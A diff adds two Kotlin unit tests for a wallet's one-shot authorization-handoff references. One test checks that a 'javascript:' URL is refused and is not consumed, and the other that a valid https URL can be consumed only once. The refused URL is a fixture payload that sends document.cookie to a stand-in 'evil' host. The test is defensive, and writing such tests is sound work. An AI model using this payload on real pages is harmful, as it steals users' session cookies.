@@ -57,6 +57,52 @@ class StoreBackedWalletInteractionSensitiveInputAuthorityTest {
         }
 
     @Test
+    fun `an unopenable authorization handoff is refused and remains consumable`() =
+        runTest {
+            val authority = StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore())
+            val session = WalletInteractionSessionId("session-a")
+            val ref =
+                authority.register(
+                    session,
+                    WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
+                    "javascript:fetch(\"//evil/\"+document.cookie)",
+                )
+
+            val first =
+                assertFailsWith<IllegalArgumentException> {
+                    authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF, ref)
+                }
+            assertEquals("wallet_interaction_authorization_handoff_unopenable", first.message)
+
+            val second =
+                assertFailsWith<IllegalArgumentException> {
+                    authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF, ref)
+                }
+            assertEquals(
+                "wallet_interaction_authorization_handoff_unopenable",
+                second.message,
+                "a refused URL must not spend the one-shot; the holder can try again",
+            )
+        }
+
+    @Test
+    fun `an openable authorization handoff is still one-use`() =
+        runTest {
+            val authority = StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore())
+            val session = WalletInteractionSessionId("session-a")
+            val url = "https://issuer.example/authorize?request=abc"
+            val ref =
+                authority.register(
+                    session,
+                    WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
+                    url,
+                )
+
+            assertEquals(url, authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF, ref))
+            assertNull(authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF, ref))
+        }
+
+    @Test
     fun blankInputsAreRejectedAndClearInvalidatesOutstandingRefs() =
         runTest {
             val authority = StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore())
